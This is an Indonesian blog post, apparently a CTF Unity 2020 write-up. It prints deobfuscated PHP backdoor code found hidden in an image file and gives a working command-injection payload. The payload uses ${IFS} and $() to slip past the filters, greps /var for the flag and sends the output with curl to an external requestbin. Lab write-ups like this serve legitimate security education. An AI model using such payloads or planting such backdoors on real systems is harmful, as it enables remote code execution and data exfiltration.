---
title: Writeup CTF Unity 2020 - Backdoor
author: cacadosman
type: post
date: 2020-03-16T00:00:00+00:00
url: /writeup-ctf-unity-2020-backdoor/
comments: true
categories:
    - CTF
    - Cyber Security

---
Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.   

URL Challenge: http://68.183.176.121/


Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor.
Benar saja, terdapat source yang mencurigakan pada file **./assets/img/default.jfif** 
Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.

Berikut adalah hasil kode yang sudah dirapikan:
```php
<?php 

include "variables.php";


$kadsooasd="st";
$ldksadsakla="ev";
$lkklklkdasl="r";
$strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev
$hello = "bjlgqipqipeaelohasnda";
$hello.=$hello[strlen($hello)-7];
$hello.=$hello[2];
$hello.=$hello[strlen($hello)-10];
$hello.=$hello[10];
$hello.=$hello[strlen($hello)-10];
$hello=substr($hello,strlen($hello)-(ord($hello[4])-ord($hello[2])));
$hello=@$strrev($hello);


function shell($lkklklkdaslmd){
    include "variables.php";
    return @$$$$kamu($lkklklkdaslmd); //die
};

function title($string){
    include "variables.php";
    global $strrev;
    $date = date('Y-m-d');
    $kadsooasds = @$strrev(chr(111)."h".$$$$$heker[0].$$dia[2]); //echo
    echo $kadsooasds;
    $string = str_replace(" ","_",$string);
    $ret=$$$$$$$kamu.$$$mati[0]; //exec
    return @$ret("$kadsooasds \"$string-$date.txt\""); 
}

if (isset($_POST['name'], $_POST['email'], $_POST['subject'],
$_POST['message'])){ 
    if (!empty(strpos("unity $_POST[message]", $hello))){
        $f = fopen("./uny/mail/".title(htmlentities($_POST['name'])), 'w');
        // echo $f;
        $isi = "From\t\t: $_POST[email]
Subject\t\t: $_POST[subject]
Message\t\t: $_POST[message]";
        fwrite($f, $isi);
        die("Done");
    }
} 
?>
```

Hal yang mencurigakan adalah, pada baris kode:
```php
return @$ret("$kadsooasds \"$string-$date.txt\"");
```

Kode tersebut melakukan return fungsi **exec** yang dapat mengakibatkan **Remote Code Execution**. Jika diterjemahkan, kode tersebut mengeksekusi:
```php
return exec("echo \"$string-$date.txt\"");
```

Dimana kita bisa mengubah nilai dari variabel **$string** berdasarkan parameter **name** pada metode **POST**. Sialnya, terdapat fungsi **htmlentities** dan fungsi yang melakukan replace spasi menjadi underscore, sehingga untuk membypassnya menjadi sulit.

Sehingga, untuk membypass filter, kita akan gunakan beberapa trik berikut:
- Spasi diganti dengan **${IFS}**
- Karena tidak bisa menggunakan single dan double quotes, kita akan menggunakan **$()** untuk mengeksekusi command bash.
- Karena tidak ada outputnya (blind), kita akan melempar hasil dari command yang kita inject menggunakan curl ke **requestbin** dengan perintah `curl${IFS}--data${IFS}{a=command}${IFS}https://iniurlpokoknya.com`.
- Agar data yang dikirimkan tidak error, kita akan convert outputnya menjadi base64 dengan command `command|base64${IFS}-w${IFS}0`

Maka hasil akhir payloadnya sebagai berikut:
```bash
$(curl${IFS}--data${IFS}{a=$(grep${IFS}-r${IFS}UNITY${IFS}/var|base64${IFS}-w${IFS}0)}${IFS}https://envcnlmm9u3oa.x.pipedream.net)
```

Terus flagnya mana? 
Jadi flagnya kita kirim ke url https://enkak77rjv029.x.pipedream.net (requestbin) menggunakan curl dan diencode menjadi base64.
![RequestBin](/requestbin.PNG)

Lalu kita decode base64 nya
![RequestBin](/backdoorflag.PNG)

Maka kita berhasil mendapatkan flagnya ^_^

Sekian pembahasan yang saya sampaikan.
Apabila terdapat kesalahan baik yang disengaja dan tidak, saya mohon maaf dan tolong untuk dikoreksi.

Semoga artikel ini dapat bermanfaat.  
Terima kasih.